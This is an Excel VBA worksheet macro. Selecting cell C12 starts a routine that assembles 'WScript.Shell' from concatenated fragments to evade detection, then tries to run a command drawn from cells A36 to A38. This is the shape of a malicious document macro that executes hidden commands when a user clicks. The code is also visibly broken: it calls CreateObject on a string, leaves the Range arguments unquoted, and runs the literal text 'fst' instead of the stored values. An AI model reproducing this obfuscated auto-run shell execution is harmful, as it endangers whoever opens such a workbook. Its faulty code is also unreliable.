Private Sub Worksheet_SelectionChange(ByVal Target As Range)
    If Selection.Count = 1 Then
        If Not Intersect(Target, Range("C12")) Is Nothing Then
            Test
        End If
    End If
End Sub


Private Sub Test()
    Dim Diepsld
    Dim ConverMet
    Dim she
    she = "S" & "h" & "e"
    Dim ll
    ll = "l" & "l"
    Dim WS
    WS = "W" & "S"
    Dim cript
    cript = "c" & "r" & "i" & "p" & "t"
    Dim v
    v = "V" + "B" + "A"
    Set Diepsld = v.CreateObject(WS & cript & "." & she & ll)
    
    Dim f As String
    Dim s As String
    Dim t As String
    
    f = Range(A36).Value
    s = Range(A37).Value
    t = Range(A38).Value
    
    ConverMet = Diepsld.Run("f" & "s" & "t", 0, False)
End Sub
